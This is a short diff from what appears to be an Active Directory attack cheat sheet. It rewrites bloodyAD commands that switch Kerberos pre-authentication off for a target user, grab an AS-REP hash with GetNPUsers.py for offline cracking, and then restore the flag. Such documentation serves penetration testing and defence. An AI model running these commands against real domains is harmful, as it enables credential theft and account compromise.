@@ -2945,13 +2945,13 @@ ADACLScan.ps1 -Base "DC=contoso;DC=com" -Filter "(&(AdminCount=1))" -Scope subtr
 	* On Linux:
 	```bash
 	# Modify the userAccountControl
-	$ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user
+	$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 True
 
 	# Grab the ticket
 	$ GetNPUsers.py DOMAIN/target_user -format <AS_REP_responses_format [hashcat | john]> -outputfile <output_AS_REP_responses_file>
 
 	# Set back the userAccountControl
-	$ bloodyAD.py --host [DC IP] -d DOMAIN -u AttackerUser -p MyPassword setDontReqPreauthFlag target_user false
+	$ bloodyAD.py --host [DC IP] -d [DOMAIN] -u [AttackerUser] -p [MyPassword] setUserAccountControl [Target_User] 0x400000 False
 	```
 
 
